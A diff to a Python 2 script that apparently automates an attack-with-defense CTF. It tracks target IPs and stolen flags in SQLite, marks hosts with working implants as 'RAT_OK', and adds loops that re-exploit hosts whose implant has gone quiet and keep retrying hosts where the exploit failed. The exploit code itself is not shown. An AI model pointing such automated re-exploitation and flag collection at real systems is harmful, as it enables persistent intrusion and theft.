@@ -58,7 +58,7 @@ def run(target):
 
 
 
-def scan():
+def scan(targets):
     for target in targets:
         try:
             exploit(target,port)
@@ -96,7 +96,7 @@ def initdb(name):
 
     conn = sqlite3.connect(name)
     cursor = conn.cursor()
-    cursor.execute('create table awd (ip varchar(20), status varchar(20), flag varchar(40))')
+    cursor.execute('create table awd (ip varchar(20), status varchar(20), flag varchar(40),tick int)')
     # cursor.execute('insert into user (ip, state,flag) values ("123.123.123.11", "init","{fadsfasdfj}")')
     cursor.close()
     conn.commit()
@@ -124,7 +124,7 @@ class Handler_ckx(StreamRequestHandler):
             idx=targets.index(ip)
             # print idx
             flag=self.request.recv(100)
-            updatedb("./our.db",ip,"get",flag)
+            updatedb("./our.db",ip,"RAT_OK",flag)
             
             # tarlist[idx][1]="get"
             # tarlist[idx][2]=flag
@@ -141,8 +141,49 @@ class Handler_ckx(StreamRequestHandler):
 
 
 # arg1=123
+def heartbeat():
+    while 1:
+        if(int(time.time())%3==0):
 
+            conn=sqlite3.connect("./our.db")
+            cursor = conn.execute("SELECT ip,tick FROM awd WHERE status GLOB 'RAT_O*'")
+            # print row
+            for row in cursor:
+                updatedb("./our.db",row[0],"RAT_OK_WAIT","wait_flag",tick=row[1]+1)
+            # localtime = time.asctime( time.localtime(time.time()) )
+            conn.close()
+        sleep(1)
 
+def keepit():
+    while 1:
+        # print ":aadsfasdfasd"
+        targets=[]
+        if(int(time.time())%2==0):
+            print "keeper ....."
+            conn=sqlite3.connect("./our.db")
+            cursor = conn.execute("SELECT ip FROM awd WHERE tick > 3")
+            for row in cursor:
+                print "///////////\\n\n\n\n\n"
+                targets.append(row[0])
+            conn.close()
+            scan(targets)
+
+            # pass
+        sleep(1)   
+
+def fail_but_attack():
+    while 1:
+        stubborn_targets=[]
+        if(int(time.time())%5==0):
+            conn=sqlite3.connect("./our.db")
+
+            cursor = conn.execute("SELECT ip FROM awd WHERE status GLOB 'expfai*'")
+            for row in cursor:
+                stubborn_targets.append(row[0])
+            print "attack again..."
+            scan(stubborn_targets)
+        sleep(3)
+                
 
 def recv_server():
     tarlist[0][1]="ggg"
@@ -164,13 +205,19 @@ def recv_server():
 
 
 
-p_scan=Process(target=scan,args=())
-p_recv=Process(target=recv_server,args=())
-
 
 
 # init our database
 initdb("./our.db")
+
+
+
+p_scan=Process(target=scan,args=(targets,))
+p_recv=Process(target=recv_server,args=())
+p_heartbeat=Process(target=heartbeat)
+p_keepit=Process(target=keepit)
+p_stillattack=Process(target=fail_but_attack)
+
 tarlist=init_target_list(targets)
 for i in tarlist:
     insertdb("./our.db",i[0],i[1],i[2])
@@ -188,6 +235,10 @@ print "start listening...."
 p_scan.start()
 raw_input()
 p_recv.start()
+p_heartbeat.start()
+p_keepit.start()
+p_stillattack.start()
+
 sleep(1)
 while 1:
     print "\n"*9
